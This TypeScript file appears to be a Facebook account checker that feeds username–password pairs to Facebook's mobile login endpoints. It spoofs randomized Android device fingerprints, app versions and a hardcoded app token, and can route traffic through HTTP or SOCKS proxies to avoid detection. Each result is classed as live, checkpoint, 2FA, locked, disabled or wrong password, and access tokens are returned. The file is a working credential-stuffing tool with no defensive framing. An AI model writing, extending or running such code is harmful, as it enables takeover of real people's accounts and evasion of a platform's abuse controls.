import { ProxyAgent, fetch as undiciFetch, Agent as UndiciAgent, type Dispatcher } from "undici";
import { SocksProxyAgent } from "socks-proxy-agent";
import https from "node:https";

// ── Proxy helpers ─────────────────────────────────────────────────────────────

function makeUndiciDispatcher(proxyUrl: string): Dispatcher | null {
  const scheme = new URL(proxyUrl).protocol;
  if (scheme === "socks5:" || scheme === "socks4:" || scheme === "socks4a:" || scheme === "socks:") {
    return null;
  }
  return new ProxyAgent(proxyUrl);
}

async function httpsPostViaSocks(
  url: string,
  headers: Record<string, string>,
  body: string,
  proxyUrl: string,
): Promise<string> {
  const agent = new SocksProxyAgent(proxyUrl);
  const parsed = new URL(url);
  return new Promise<string>((resolve, reject) => {
    const bodyBuf = Buffer.from(body, "utf8");
    const req = https.request(
      {
        hostname: parsed.hostname,
        port: Number(parsed.port) || 443,
        path: parsed.pathname + (parsed.search ?? ""),
        method: "POST",
        headers: { ...headers, "Content-Length": String(bodyBuf.length) },
        agent,
      },
      (res) => {
        let data = "";
        res.setEncoding("utf8");
        res.on("data", (chunk) => { data += chunk; });
        res.on("end", () => resolve(data));
      },
    );
    req.setTimeout(18_000, () => { req.destroy(new Error("timeout")); });
    req.on("error", reject);
    req.write(bodyBuf);
    req.end();
  });
}

// ── Device pool ───────────────────────────────────────────────────────────────

interface AndroidDevice {
  model: string;
  brand: string;
  build: string;
  os: string;
  osApi: number;
  dpi: number;
  width: number;
  height: number;
  carrier: string;
  arch: string;
}

const ANDROID_DEVICES: AndroidDevice[] = [
  // Samsung Galaxy S series (2022–2024)
  { model: "SM-S901B", brand: "samsung", build: "S901BXXU5CWL1", os: "14", osApi: 34, dpi: 425, width: 1080, height: 2340, carrier: "T-Mobile", arch: "arm64-v8a" },
  { model: "SM-S908B", brand: "samsung", build: "S908BXXU5CWL2", os: "14", osApi: 34, dpi: 500, width: 1080, height: 2340, carrier: "AT&T",    arch: "arm64-v8a" },
  { model: "SM-S921B", brand: "samsung", build: "S921BXXU2AXC4", os: "14", osApi: 34, dpi: 416, width: 1080, height: 2340, carrier: "Verizon",  arch: "arm64-v8a" },
  { model: "SM-S928B", brand: "samsung", build: "S928BXXU2AXC3", os: "14", osApi: 34, dpi: 506, width: 1440, height: 3088, carrier: "T-Mobile", arch: "arm64-v8a" },
  { model: "SM-G991B", brand: "samsung", build: "G991BXXU8EWL1", os: "13", osApi: 33, dpi: 421, width: 1080, height: 2400, carrier: "AT&T",    arch: "arm64-v8a" },
  { model: "SM-G998B", brand: "samsung", build: "G998BXXU6EWK2", os: "13", osApi: 33, dpi: 516, width: 1440, height: 3200, carrier: "T-Mobile", arch: "arm64-v8a" },
  { model: "SM-A546B", brand: "samsung", build: "A546BXXU5CXL1", os: "14", osApi: 34, dpi: 405, width: 1080, height: 2340, carrier: "Cricket",  arch: "arm64-v8a" },
  // Google Pixel (2022–2024)
  { model: "Pixel 7",    brand: "google", build: "AP1A.240405.002", os: "14", osApi: 34, dpi: 416, width: 1080, height: 2400, carrier: "Google Fi", arch: "arm64-v8a" },
  { model: "Pixel 7 Pro", brand: "google", build: "AP1A.240405.002.B1", os: "14", osApi: 34, dpi: 512, width: 1440, height: 3120, carrier: "T-Mobile", arch: "arm64-v8a" },
  { model: "Pixel 8",    brand: "google", build: "AP2A.240805.005", os: "14", osApi: 34, dpi: 428, width: 1080, height: 2400, carrier: "AT&T",    arch: "arm64-v8a" },
  { model: "Pixel 8 Pro", brand: "google", build: "AP2A.240805.005", os: "14", osApi: 34, dpi: 489, width: 1344, height: 2992, carrier: "Verizon",  arch: "arm64-v8a" },
  { model: "Pixel 6a",   brand: "google", build: "TP1A.221005.002", os: "13", osApi: 33, dpi: 429, width: 1080, height: 2400, carrier: "Google Fi", arch: "arm64-v8a" },
  // OnePlus / Xiaomi (2022–2024)
  { model: "CPH2447",   brand: "oneplus", build: "CPH2447_13.1.0.595", os: "13", osApi: 33, dpi: 450, width: 1080, height: 2412, carrier: "T-Mobile", arch: "arm64-v8a" },
  { model: "23049RAD8G", brand: "xiaomi", build: "UKQ1.230917.001", os: "13", osApi: 33, dpi: 395, width: 1080, height: 2400, carrier: "AT&T",    arch: "arm64-v8a" },
  { model: "2304FPN6DG", brand: "xiaomi", build: "UKQ1.231003.001", os: "14", osApi: 34, dpi: 460, width: 1220, height: 2712, carrier: "T-Mobile", arch: "arm64-v8a" },
  { model: "22111317G",  brand: "xiaomi", build: "SKQ1.221013.001", os: "12", osApi: 32, dpi: 395, width: 1080, height: 2400, carrier: "Verizon",  arch: "arm64-v8a" },
  // Motorola
  { model: "moto g power 5G 2024", brand: "motorola", build: "U1TK34.41-55-4", os: "14", osApi: 34, dpi: 269, width: 1080, height: 2400, carrier: "Cricket", arch: "arm64-v8a" },
];

const LOCALES = ["en_US", "en_GB", "en_CA", "en_AU", "en_IN"];

// Current FB Android app versions (2024–2025 range)
const FB_VERSIONS = [
  { av: "401.0.0.27.183", bv: "401215053" },
  { av: "404.0.0.25.106", bv: "404065782" },
  { av: "407.0.0.25.107", bv: "407089432" },
  { av: "410.0.0.30.107", bv: "410062831" },
  { av: "414.0.0.21.76",  bv: "414041726" },
  { av: "418.0.0.27.107", bv: "418056832" },
  { av: "422.0.0.33.97",  bv: "422083751" },
  { av: "427.0.0.31.96",  bv: "427091234" },
  { av: "431.0.0.33.100", bv: "431087652" },
  { av: "436.0.0.35.111", bv: "436093412" },
  { av: "440.0.0.29.107", bv: "440078932" },
  { av: "445.0.0.33.107", bv: "445094123" },
  { av: "449.0.0.35.116", bv: "449095831" },
  { av: "453.0.0.38.104", bv: "453091234" },
];

const FB_APP_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32";

// ── Utilities ─────────────────────────────────────────────────────────────────

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randHex(length: number): string {
  return Array.from({ length }, () => Math.floor(Math.random() * 16).toString(16)).join("");
}

function formatUUID(): string {
  return [
    randHex(8), randHex(4),
    "4" + randHex(3),
    (8 + randInt(0, 3)).toString(16) + randHex(3),
    randHex(12),
  ].join("-");
}

function randAlphaNum(len: number): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

/** FB's jazoest checksum — sum of charCodes of the adid string, prepended with "2" */
function calcJazoest(adid: string): string {
  const sum = adid.split("").reduce((acc, c) => acc + c.charCodeAt(0), 0);
  return "2" + String(sum);
}

// ── Build request ─────────────────────────────────────────────────────────────

function buildLoginPayload(uid: string, password: string): {
  params: URLSearchParams;
  headers: Record<string, string>;
  adid: string;
} {
  const device  = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)];
  const ver     = FB_VERSIONS[Math.floor(Math.random() * FB_VERSIONS.length)];
  const locale  = LOCALES[Math.floor(Math.random() * LOCALES.length)];
  const adid    = formatUUID();
  const deviceId = formatUUID();
  const familyDeviceId = formatUUID();
  const machineId = randAlphaNum(24);
  const density = (device.dpi / 160).toFixed(1);

  const ua = [
    "[FBAN/FB4A",
    `FBAV/${ver.av}`,
    `FBBV/${ver.bv}`,
    `FBDM/{density=${density},width=${device.width},height=${device.height}}`,
    `FBLC/${locale}`,
    `FBCR/${device.carrier}`,
    `FBMF/${device.brand}`,
    `FBBD/${device.brand}`,
    `FBDV/${device.model}`,
    `FBSV/${device.os}.0.0`,
    `FBCA/${device.arch}:armeabi-v7a`,
    `FBFW/1`,
    `FBRV/0`,
    `FBPN/com.facebook.katana`,
    `FBCFT/0`,
    `FBOP/1`,
    `FBDPI/${device.dpi}]`,
  ].join(";");

  const params = new URLSearchParams();
  params.append("adid",                      adid);
  params.append("format",                    "json");
  params.append("device_id",                 deviceId);
  params.append("cpl",                       "true");
  params.append("family_device_id",          familyDeviceId);
  params.append("credentials_type",          "device_based_login_password");
  params.append("error_detail_type",         "button_with_disabled");
  params.append("source",                    "device_based_login");
  params.append("email",                     uid);
  params.append("password",                  password);
  params.append("access_token",              FB_APP_TOKEN);
  params.append("generate_session_cookies",  "1");
  params.append("meta_inf_fbmeta",           "NO_FILE");
  params.append("advertiser_id",             adid);
  params.append("currently_logged_in_userid","0");
  params.append("locale",                    locale);
  params.append("client_country_code",       "US");
  params.append("method",                    "auth.login");
  params.append("fb_api_req_friendly_name",  "authenticate");
  params.append("fb_api_caller_class",       "com.facebook.account.login.protocol.Fb4aAuthHandler");
  params.append("jazoest",                   calcJazoest(adid));
  params.append("machine_id",                machineId);
  params.append("generate_machine_id",       "1");
  params.append("try_num",                   "1");
  params.append("enroll_misauth",            "false");
  params.append("unrecognized_tries",        "0");

  const headers: Record<string, string> = {
    "Content-Type":          "application/x-www-form-urlencoded",
    "User-Agent":            ua,
    "Host":                  "b-graph.facebook.com",
    "X-FB-Net-HNI":          String(randInt(20000, 40000)),
    "X-FB-SIM-HNI":          String(randInt(20000, 40000)),
    "X-FB-Connection-Type":  "MOBILE.LTE",
    "X-FB-Connection-Quality": "EXCELLENT",
    "X-Tigon-Is-Retry":      "False",
    "X-FB-HTTP-Engine":      "Liger",
    "X-FB-Client-IP":        "True",
    "X-FB-Server-Cluster":   "True",
    "X-ASBD-ID":             "129477",
    "X-FB-Friendly-Name":    "authenticate",
    "Accept":                "*/*",
    "Accept-Encoding":       "gzip, deflate",
    "Accept-Language":       locale.replace("_", "-") + ",en;q=0.9",
    "Connection":            "keep-alive",
  };

  return { params, headers, adid };
}

// ── Status detection ──────────────────────────────────────────────────────────

export type LoginStatus = "live" | "dead" | "checkpoint" | "2fa" | "locked" | "disabled" | "wrongpass";

export interface LoginResult {
  status: LoginStatus;
  accessToken: string | null;
  errorCode?: number;
  errorSubcode?: number;
}

function detectStatus(json: Record<string, unknown>, uid: string): LoginResult {
  if (json.access_token && typeof json.access_token === "string") {
    return { status: "live", accessToken: json.access_token };
  }

  if (json.session_cookies && Array.isArray(json.session_cookies) && json.session_cookies.length > 0) {
    return { status: "live", accessToken: null };
  }

  const errObj = json.error as Record<string, unknown> | undefined;
  if (!errObj) {
    return { status: "dead", accessToken: null };
  }

  const code    = Number(errObj.code ?? 0);
  const subcode = Number(errObj.error_subcode ?? 0);
  const msg     = String(errObj.message ?? errObj.error_user_msg ?? "").toLowerCase();
  const title   = String((errObj as Record<string, unknown>).error_user_title ?? "").toLowerCase();
  const combined = msg + " " + title;

  console.log("[fb-check] uid=%s code=%s sub=%s msg=%s", uid, code, subcode, msg.slice(0, 100));

  // Checkpoint
  if (
    subcode === 406 ||
    combined.includes("checkpoint") ||
    combined.includes("please review") ||
    combined.includes("confirm your identity") ||
    combined.includes("verify your account") ||
    combined.includes("suspicious login")
  ) {
    return { status: "checkpoint", accessToken: null, errorCode: code, errorSubcode: subcode };
  }

  // 2FA
  if (
    subcode === 464 ||
    combined.includes("two_factor") ||
    combined.includes("two factor") ||
    combined.includes("two-factor") ||
    combined.includes("confirmation code") ||
    combined.includes("security code") ||
    combined.includes("login approval") ||
    combined.includes("enter the code")
  ) {
    return { status: "2fa", accessToken: null, errorCode: code, errorSubcode: subcode };
  }

  // Locked / Suspicious
  if (
    combined.includes("locked") ||
    combined.includes("suspicious") ||
    combined.includes("temporarily blocked") ||
    combined.includes("unusual activity") ||
    combined.includes("account is temporarily")
  ) {
    return { status: "locked", accessToken: null, errorCode: code, errorSubcode: subcode };
  }

  // Disabled — specific codes only (NOT broad code 190)
  if (
    code === 368 ||
    (code === 190 && (subcode === 458 || subcode === 467)) ||
    combined.includes("account has been disabled") ||
    combined.includes("your account has been") ||
    combined.includes("account was disabled") ||
    combined.includes("account is disabled") ||
    combined.includes("permanently removed") ||
    combined.includes("has been removed from facebook")
  ) {
    return { status: "disabled", accessToken: null, errorCode: code, errorSubcode: subcode };
  }

  // Wrong password / bad credentials
  if (
    code === 401 ||
    subcode === 460 ||
    subcode === 401 ||
    subcode === 2444 ||
    combined.includes("wrong password") ||
    combined.includes("incorrect password") ||
    combined.includes("password you entered") ||
    combined.includes("invalid password") ||
    combined.includes("password is incorrect") ||
    combined.includes("entered an incorrect password") ||
    combined.includes("password doesn") ||
    combined.includes("try again")
  ) {
    return { status: "wrongpass", accessToken: null, errorCode: code, errorSubcode: subcode };
  }

  return { status: "dead", accessToken: null, errorCode: code, errorSubcode: subcode };
}

// ── Main checker ──────────────────────────────────────────────────────────────

const FB_ENDPOINTS = [
  "https://b-graph.facebook.com/auth/login",
  "https://graph.facebook.com/auth/login",
];

export async function checkFbLogin(uid: string, password: string, proxyUrl?: string): Promise<LoginResult> {
  const { params, headers, adid: _ } = buildLoginPayload(uid, password);
  const bodyStr = params.toString();

  for (const endpoint of FB_ENDPOINTS) {
    try {
      headers["Host"] = new URL(endpoint).hostname;

      let text: string;

      if (proxyUrl) {
        const dispatcher = makeUndiciDispatcher(proxyUrl);
        if (dispatcher === null) {
          text = await httpsPostViaSocks(endpoint, headers, bodyStr, proxyUrl);
        } else {
          const res = await undiciFetch(endpoint, {
            method: "POST",
            headers,
            body: bodyStr,
            signal: AbortSignal.timeout(18_000),
            dispatcher,
          });
          text = await res.text();
        }
      } else {
        const res = await undiciFetch(endpoint, {
          method: "POST",
          headers,
          body: bodyStr,
          signal: AbortSignal.timeout(18_000),
          dispatcher: new UndiciAgent(),
        });
        text = await res.text();
      }

      let json: Record<string, unknown>;
      try {
        json = JSON.parse(text) as Record<string, unknown>;
      } catch {
        console.error("[fb-check] Non-JSON from %s:", endpoint, text.slice(0, 150));
        continue; // try next endpoint
      }

      const result = detectStatus(json, uid);

      // "dead" from first endpoint → retry with second before giving up
      if (result.status === "dead" && endpoint === FB_ENDPOINTS[0]) {
        continue;
      }

      return result;
    } catch (err) {
      console.error("[fb-check] Request error on %s: %s", endpoint, (err as Error).message);
      // try next endpoint
    }
  }

  return { status: "dead", accessToken: null };
}
